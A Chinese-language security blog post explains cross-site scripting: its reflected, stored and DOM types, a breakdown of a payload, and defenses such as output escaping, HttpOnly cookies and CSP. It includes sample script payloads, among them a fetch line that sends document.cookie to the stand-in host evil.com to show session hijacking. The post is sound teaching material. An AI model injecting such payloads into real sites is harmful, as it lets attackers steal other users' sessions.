上一篇文章聊了 [SQL 注入](/blog/sql-injection)：后端把输入当代码执行，数据库被攻破。今天聊它的"兄弟漏洞" XSS——这次轮到**浏览器**执行攻击者的代码。

## 从一个评论区说起

假设某网站的留言板有个漏洞：用户输入什么，页面就**原样输出**什么。

一位访客留下这样一条"留言"：

```html
<script>alert(document.cookie)</script>
```

下一位访客打开这个页面时，浏览器把这段文字当成了**网页代码**执行——弹窗里显示的不是什么，而是他**自己的登录凭证**。

留言的人什么都没偷，但所有看过这条留言的人都中招了。这就是 XSS（Cross-Site Scripting，跨站脚本攻击）。

## 三种类型：注入点不一样

| 类型 | 注入点 | 触发方式 | 危险程度 |
| --- | --- | --- | --- |
| 反射型 | URL 参数、表单输入 | 受害者点击**构造好的链接** | 需要诱骗点击 |
| 存储型 | 留言、昵称等**存进数据库**的内容 | 任何人打开页面**自动触发** | 最高，一打一大片 |
| DOM 型 | 不经过服务器，前端 JS 自己处理输入时产生 | 打开链接即触发 | 隐蔽，最难排查 |

**反射型**就像"回声"：`?q=<script>…</script>` 被服务器原样写回页面，只对点开这个链接的人有效。攻击者通常把它藏在钓鱼邮件、短链接里。

**存储型**是把代码"种"在了服务器上。留言板、评论区、用户名——每个访问者都会加载这段代码。上面评论区例子就是存储型。

**DOM 型**最特别：请求里**根本没有**这段代码。比如前端用 `innerHTML` 把 URL 里的片段拼进页面，浏览器执行时才"现出原形"，服务器全程不知情。

## 一段 payload 拆开看

```html
<script>alert(document.cookie)</script>
```

- `<script>`：告诉浏览器"以下是可执行代码"
- `alert()`：弹窗（攻击者用来验证漏洞，真实攻击会换成偷数据的代码）
- `document.cookie`：当前网站的 Cookie

攻击者真正想做的不是弹窗，而是 `fetch` 到自己的服务器：

```html
<script>
  fetch("https://evil.com/steal?c=" + encodeURIComponent(document.cookie));
</script>
```

Cookie 一到手，就可能**冒充你的身份登录**——这就是"会话劫持"。

## 为什么这么难防

因为 XSS 钻的空子是：**浏览器分不清「代码」和「数据」**。页面里混进了一段用户输入，浏览器无法判断它是"留言内容"还是"页面指令"，只能执行。

这和 [SQL 注入](/blog/sql-injection) 的根源一模一样：数据被当成了代码。区别只是"执行者"从数据库换成了浏览器。

## 防御三板斧

**1. 输出转义**：把 `<` 变成 `&lt;`，浏览器就会把它显示成文字而不是代码。这是最根本的一招——React 等现代框架默认就做转义，用 `innerHTML` 拼接字符串才会翻车。

**2. HttpOnly Cookie**：给 Cookie 加上 `HttpOnly` 标记，JavaScript 就**读不到** `document.cookie` 了——即使 XSS 成功，最值钱的东西也拿不走。

**3. CSP（内容安全策略）**：通过响应头白名单告诉浏览器"只允许执行本站的脚本"。哪怕注入成功，外链脚本也加载不了。

> 一句话总结：**永远不要信任输入，永远不要直接拼接输出**——上一篇文章的结论在这里依然成立。
